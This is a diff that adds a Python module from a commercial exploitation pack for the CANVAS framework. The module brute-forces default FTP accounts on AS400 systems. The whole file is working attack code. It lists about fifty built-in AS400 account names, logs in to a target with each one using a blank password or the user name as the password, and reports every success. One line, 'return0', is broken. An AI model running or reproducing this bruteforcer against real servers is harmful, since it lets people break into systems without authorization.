@@ -1,0 +1,115 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import os
+import getopt
+import sys
+import socket
+import struct
+import string
+
+sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from canvasexploit import canvasexploit
+
+NAME = 'd2sec_as400_ftpd_default_accounts'
+DESCRIPTION='AS400 Ftpd Default Accounts Bruteforcer'
+VERSION='0.1'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE']='Tools'
+PROPERTY['SITE']='Remote'
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+
+class theexploit(canvasexploit):
+
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.port = 21
+    self.users = ['QAUTPROF', 'QDBSHR', 'QDOC', 'QLPAUTO', 'QNETSPLF',
+      'QPGMR', 'QSECOFR', 'QSRVBAS', 'QTFTP', 'QTSTRQS', 'QBRMS', 'QDBSHRDO',
+      'QDSNX', 'QLPINSTALL', 'QNFSANON', 'QPM400', 'QSNADS', 'QSVCDRCTR',
+      'QTMHHTP1', 'QUMB', 'QCLUMGT', 'QDFTOWN', 'QEJB', 'QMQM', 'QNOTES',
+      'QPRJOWN', 'QSPL', 'QSYS', 'QTMHHTTP', 'QUSER', 'QCLUSTER', 'QDIRSRV',
+      'QFNC', 'QMQMADM', 'QNTP', 'QRJE', 'QSPLJOB', 'QSYSOPR', 'QTMPLPD',
+      'QYPSJSVR', 'QCOLSRV', 'QDLFM', 'QGATE', 'QMSF', 'QPEX', 'QRMTCAL',
+      'QSRV', 'QTCP', 'QTMTWSG', 'QYPUOWN',
+    ]
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port', self.port))
+
+  def check_default_accounts(self):
+    s = self.gettcpsock()
+    try:
+      s.connect((self.host, self.port))
+    except (socket.error, timeoutsocket.Timeout):
+      self.log('[D2] No connection could be established')
+      return -1
+    try:
+      data = s.recv(5000)
+    except timeoutsocket.Timeout:
+      data = ''
+    except socket.error:
+      self.log('[D2] Error while reading data')
+      s.close()
+      return0 
+    s.sendall("USER %s\r\n" % self.user)
+    try:
+      data = s.recv(5000)
+    except (socket.error, timeoutsocket.Timeout):
+      return 0
+    s.sendall("PASS %s\r\n" % self.password)
+    try:
+      data = s.recv(5000)
+    except (socket.error, timeoutsocket.Timeout):
+      return 0
+    if "530" in data:
+      return 0
+    self.log('[D2] Logged into ftp server at %s with %s:%s' % (self.host, self.user, self.password))
+    s.close()
+    return 1
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    for user in self.users:
+      self.user = user
+      self.password = '' 
+      r = self.check_default_accounts()
+      if r == -1:
+        break
+      if r == 0:
+        self.password = user
+        self.check_default_accounts()
+    self.log('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    return 1
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
